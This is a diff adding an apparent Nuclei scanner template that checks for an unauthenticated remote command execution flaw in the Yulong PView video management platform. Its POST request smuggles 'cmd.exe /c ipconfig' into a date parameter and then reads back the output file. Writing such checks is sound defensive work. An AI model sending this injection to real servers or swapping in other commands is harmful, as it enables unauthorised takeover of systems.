@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - IP
+            - Windows
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /index.php?r=Third/TimeSyn HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+          Content-Type: application/x-www-form-urlencoded
+
+          cloudKey=0x0&date=|cmd.exe+/c+ipconfig+>+{{username}}.txt&time=1
+        - |
+          GET /{{username}}.txt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+id: yulong-Third_TimeSyn-RCE
+info:
+    author: Superhero
+    description: |-
+        fofa: body="PView 视音频管理平台"
+        誉龙视音频综合管理平台 Third/TimeSyn 接口存在远程命令执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。该漏洞利用难度较低，建议受影响的用户尽快修复。
+    name: 誉龙视音频综合管理平台 Third/TimeSyn 远程命令执行漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487664&idx=1&sn=229b4b4ae0c9d9dd9d64dce3f32fcd52&chksm=c267a583f5102c953f3c59e619a0196eda9df9cce115f5209e3e7026b50d2954fa23b604b788&token=1439003696&lang=zh_CN#rd
+    severity: high
+    tags:
+        - RCE
+variables:
+    username: '{{to_lower(rand_base(6))}}'
